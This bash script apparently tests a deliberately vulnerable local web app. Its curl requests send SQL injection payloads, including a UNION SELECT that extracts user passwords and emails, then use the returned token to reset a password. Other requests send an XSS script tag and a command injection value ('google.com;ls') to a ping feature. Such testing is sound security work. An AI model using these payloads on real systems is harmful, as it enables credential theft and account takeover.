#!/bin/bash
   
function test_sql_injection_registration_endpoint_with_random_data() {
    echo "------------------------------------------------"
    echo "------------------------------------------------"
    echo "Testing SQL Injection by passing default data validation to access the registration endpoint"
    curl -X POST http://localhost:5500/client_registeration -d 'fullName=John Doe&userName=johndoe&email=noname@maildrop.cc" OR "1"="1&password=password&phone=1234567890'

    curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com"OR 1=1;--&password=pwd'
}

function test_sql_injection_login_endpoint_with_random_data() {
    echo "------------------------------------------------"
    echo "------------------------------------------------"
    echo "Testing SQL Injection by passing default data validation to access the login endpoint"

    curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com"OR 1=1;--&password=pwd'
}


function test_sql_injection_to_retrieve_account_details() {
    echo "------------------------------------------------"
    echo "------------------------------------------------"
    echo "Testing SQL Injection to retrieve account details"
    # can retrieve the existing account login details using the below query
    jwt() { jq -R 'split(".") | .[1] | @base64d | fromjson' <<< $1; }

    token=$(curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com" union select password || ":" || email from users;--&password=pwd' | jq -j '.token')
    jwt $token
    echo $token
}

function test_jwt_verification_disabled() {
    echo "------------------------------------------------"
    echo "------------------------------------------------"
    echo "Testing Resetting the password of the retrieved account"
    local token = test_sql_injection_to_retrieve_account_details()
    curl -X POST http://localhost:5500/update_info -d "token=$token&currentPassword=test&newPassword=newpass"
}

function test_input_validation() {
    echo "------------------------------------------------"
    echo "------------------------------------------------"
    echo "Testing Input Validation"
    curl -X POST http://localhost:5500/client_registeration -d 'fullName=<script>alert("XSS")</script>&userName=testuser&email=test@example.com&password=test&phone=1234567890'
}

function test_insecure_use_of_ping() {
    echo "------------------------------------------------"
    echo "------------------------------------------------"
    echo "Testing Insecure Use of Ping"
    curl -X GET http://localhost:5500/products -d 'source=google.com;ls'

}

function test_weak_error_message() {
    echo "------------------------------------------------"
    echo "------------------------------------------------"
    echo "Testing Weak Error Message"
    curl -X POST http://localhost:5500/client_login -d 'email=nonexistent@example.com&password=wrongpassword'
}

test_sql_injection_registration_endpoint_with_random_data
test_sql_injection_login_endpoint_with_random_data    
test_sql_injection_to_retrieve_account_details
test_jwt_verification_disabled
test_input_validation
test_insecure_use_of_ping
test_weak_error_message